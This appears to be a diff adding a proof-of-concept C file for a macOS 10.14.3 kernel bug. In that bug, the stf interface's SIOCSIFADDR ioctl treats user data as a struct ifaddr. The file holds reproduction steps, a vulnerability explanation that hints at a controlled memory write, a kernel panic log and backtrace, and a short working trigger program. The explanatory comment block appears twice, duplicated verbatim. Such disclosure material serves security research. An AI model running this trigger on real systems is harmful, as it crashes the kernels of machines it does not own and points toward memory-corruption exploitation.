@@ -1,0 +1,152 @@
+/*
+
+# Reproduction
+Tested on macOS 10.14.3:
+$ clang -o stf_wild_read stf_wild_read.cc
+$ ./stf_wild_read
+
+# Explanation
+SIOCSIFADDR is an ioctl that sets the address of an interface.
+The stf interface ioctls are handled by the stf_ioctl function.
+The crash occurs in the following case where a `struct ifreq`
+is read into kernel memory and then casted to the incorrect
+`struct ifaddr` type. I suspect this ioctl is not intended to
+be reachable by the user, but is unintentionally exposed without
+the necessary translation from `ifreq` to `ifaddr`, e.g. as it is
+done in `inctl_ifaddr`.
+
+	case SIOCSIFADDR:
+		ifa = (struct ifaddr *)data;
+		if (ifa == NULL) {
+			error = EAFNOSUPPORT;
+			break;
+		}
+		IFA_LOCK(ifa);
+		if (ifa->ifa_addr->sa_family != AF_INET6) { // <- crash here
+			IFA_UNLOCK(ifa);
+			error = EAFNOSUPPORT;
+			break;
+		}
+
+Note that IFA_LOCK is called on user-provided data; it appears that there
+is an opportunity for memory corruption (a controlled write) when using
+indirect mutexes via LCK_MTX_TAG_INDIRECT (see lck_mtx_lock_slow).
+
+# Crash Log
+panic(cpu 6 caller 0xffffff80112da29d): Kernel trap at 0xffffff80114a2ec8, type 14=page fault, registers:
+CR0: 0x0000000080010033, CR2: 0x0000000000000001, CR3: 0x00000005e4ea1168, CR4: 0x00000000003626e0
+RAX: 0x0000000000000000, RBX: 0x000000000000002f, RCX: 0x0000000002000000, RDX: 0x0000000003000000
+RSP: 0xffffffa3d2a1bb90, RBP: 0xffffffa3d2a1bbb0, RSI: 0xffffffa3d2a1bd10, RDI: 0x0000000000000000
+R8:  0xffffff805f9db7f0, R9:  0x000000000000002d, R10: 0xffffff805e210100, R11: 0x0000000000000000
+R12: 0x0000000000000020, R13: 0xffffff805e20fcb8, R14: 0xffffff805e20fcb8, R15: 0xffffffa3d2a1bd10
+RFL: 0x0000000000010246, RIP: 0xffffff80114a2ec8, CS:  0x0000000000000008, SS:  0x0000000000000010
+Fault CR2: 0x0000000000000001, Error code: 0x0000000000000000, Fault CPU: 0x6, PL: 0, VF: 0
+
+Backtrace (CPU 6), Frame : Return Address
+0xffffffa3d2a1b660 : 0xffffff80111aeb0d mach_kernel : _handle_debugger_trap + 0x48d
+0xffffffa3d2a1b6b0 : 0xffffff80112e8653 mach_kernel : _kdp_i386_trap + 0x153
+0xffffffa3d2a1b6f0 : 0xffffff80112da07a mach_kernel : _kernel_trap + 0x4fa
+0xffffffa3d2a1b760 : 0xffffff801115bca0 mach_kernel : _return_from_trap + 0xe0
+0xffffffa3d2a1b780 : 0xffffff80111ae527 mach_kernel : _panic_trap_to_debugger + 0x197
+0xffffffa3d2a1b8a0 : 0xffffff80111ae373 mach_kernel : _panic + 0x63
+0xffffffa3d2a1b910 : 0xffffff80112da29d mach_kernel : _kernel_trap + 0x71d
+0xffffffa3d2a1ba80 : 0xffffff801115bca0 mach_kernel : _return_from_trap + 0xe0
+0xffffffa3d2a1baa0 : 0xffffff80114a2ec8 mach_kernel : _stfattach + 0x558
+0xffffffa3d2a1bbb0 : 0xffffff80114632b7 mach_kernel : _ifnet_ioctl + 0x217
+0xffffffa3d2a1bc10 : 0xffffff801145bb54 mach_kernel : _ifioctl + 0x2214
+0xffffffa3d2a1bce0 : 0xffffff8011459a54 mach_kernel : _ifioctl + 0x114
+0xffffffa3d2a1bd80 : 0xffffff801145f9cf mach_kernel : _ifioctllocked + 0x2f
+0xffffffa3d2a1bdb0 : 0xffffff80116f5718 mach_kernel : _soo_select + 0x5e8
+0xffffffa3d2a1be00 : 0xffffff80116990ab mach_kernel : _fo_ioctl + 0x7b
+0xffffffa3d2a1be30 : 0xffffff80116eefac mach_kernel : _ioctl + 0x52c
+0xffffffa3d2a1bf40 : 0xffffff80117b62bb mach_kernel : _unix_syscall64 + 0x26b
+0xffffffa3d2a1bfa0 : 0xffffff801115c466 mach_kernel : _hndl_unix_scall64 + 0x16
+*/
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <net/if.h>
+#include <string.h>
+
+/*
+# Reproduction
+Tested on macOS 10.14.3:
+$ clang -o stf_wild_read stf_wild_read.cc
+$ ./stf_wild_read
+
+# Explanation
+SIOCSIFADDR is an ioctl that sets the address of an interface.
+The stf interface ioctls are handled by the stf_ioctl function.
+The crash occurs in the following case where a `struct ifreq`
+is read into kernel memory and then casted to the incorrect
+`struct ifaddr` type. I suspect this ioctl is not intended to
+be reachable by the user, but is unintentionally exposed without
+the necessary translation from `ifreq` to `ifaddr`, e.g. as it is
+done in `inctl_ifaddr`.
+
+	case SIOCSIFADDR:
+		ifa = (struct ifaddr *)data;
+		if (ifa == NULL) {
+			error = EAFNOSUPPORT;
+			break;
+		}
+		IFA_LOCK(ifa);
+		if (ifa->ifa_addr->sa_family != AF_INET6) { // <- crash here
+			IFA_UNLOCK(ifa);
+			error = EAFNOSUPPORT;
+			break;
+		}
+
+Note that IFA_LOCK is called on user-provided data; it appears that there
+is an opportunity for memory corruption (a controlled write) when using
+indirect mutexes via LCK_MTX_TAG_INDIRECT (see lck_mtx_lock_slow).
+
+# Crash Log
+panic(cpu 6 caller 0xffffff80112da29d): Kernel trap at 0xffffff80114a2ec8, type 14=page fault, registers:
+CR0: 0x0000000080010033, CR2: 0x0000000000000001, CR3: 0x00000005e4ea1168, CR4: 0x00000000003626e0
+RAX: 0x0000000000000000, RBX: 0x000000000000002f, RCX: 0x0000000002000000, RDX: 0x0000000003000000
+RSP: 0xffffffa3d2a1bb90, RBP: 0xffffffa3d2a1bbb0, RSI: 0xffffffa3d2a1bd10, RDI: 0x0000000000000000
+R8:  0xffffff805f9db7f0, R9:  0x000000000000002d, R10: 0xffffff805e210100, R11: 0x0000000000000000
+R12: 0x0000000000000020, R13: 0xffffff805e20fcb8, R14: 0xffffff805e20fcb8, R15: 0xffffffa3d2a1bd10
+RFL: 0x0000000000010246, RIP: 0xffffff80114a2ec8, CS:  0x0000000000000008, SS:  0x0000000000000010
+Fault CR2: 0x0000000000000001, Error code: 0x0000000000000000, Fault CPU: 0x6, PL: 0, VF: 0
+
+Backtrace (CPU 6), Frame : Return Address
+0xffffffa3d2a1b660 : 0xffffff80111aeb0d mach_kernel : _handle_debugger_trap + 0x48d
+0xffffffa3d2a1b6b0 : 0xffffff80112e8653 mach_kernel : _kdp_i386_trap + 0x153
+0xffffffa3d2a1b6f0 : 0xffffff80112da07a mach_kernel : _kernel_trap + 0x4fa
+0xffffffa3d2a1b760 : 0xffffff801115bca0 mach_kernel : _return_from_trap + 0xe0
+0xffffffa3d2a1b780 : 0xffffff80111ae527 mach_kernel : _panic_trap_to_debugger + 0x197
+0xffffffa3d2a1b8a0 : 0xffffff80111ae373 mach_kernel : _panic + 0x63
+0xffffffa3d2a1b910 : 0xffffff80112da29d mach_kernel : _kernel_trap + 0x71d
+0xffffffa3d2a1ba80 : 0xffffff801115bca0 mach_kernel : _return_from_trap + 0xe0
+0xffffffa3d2a1baa0 : 0xffffff80114a2ec8 mach_kernel : _stfattach + 0x558
+0xffffffa3d2a1bbb0 : 0xffffff80114632b7 mach_kernel : _ifnet_ioctl + 0x217
+0xffffffa3d2a1bc10 : 0xffffff801145bb54 mach_kernel : _ifioctl + 0x2214
+0xffffffa3d2a1bce0 : 0xffffff8011459a54 mach_kernel : _ifioctl + 0x114
+0xffffffa3d2a1bd80 : 0xffffff801145f9cf mach_kernel : _ifioctllocked + 0x2f
+0xffffffa3d2a1bdb0 : 0xffffff80116f5718 mach_kernel : _soo_select + 0x5e8
+0xffffffa3d2a1be00 : 0xffffff80116990ab mach_kernel : _fo_ioctl + 0x7b
+0xffffffa3d2a1be30 : 0xffffff80116eefac mach_kernel : _ioctl + 0x52c
+0xffffffa3d2a1bf40 : 0xffffff80117b62bb mach_kernel : _unix_syscall64 + 0x26b
+0xffffffa3d2a1bfa0 : 0xffffff801115c466 mach_kernel : _hndl_unix_scall64 + 0x16
+*/
+
+#define IPPROTO_IP 0
+
+int main() {
+    int s = socket(AF_SYSTEM, SOCK_DGRAM, IPPROTO_IP);
+    if (s < 0) {
+        printf("failed\n");
+        return 1;
+    }
+    struct ifreq ifr = {};
+    memcpy(ifr.ifr_name, "stf0\0000", 8);
+    int err = ioctl(s, SIOCSIFADDR, (char *)&ifr);
+    close(s);
+    printf("done\n");
+    return 0;
+}
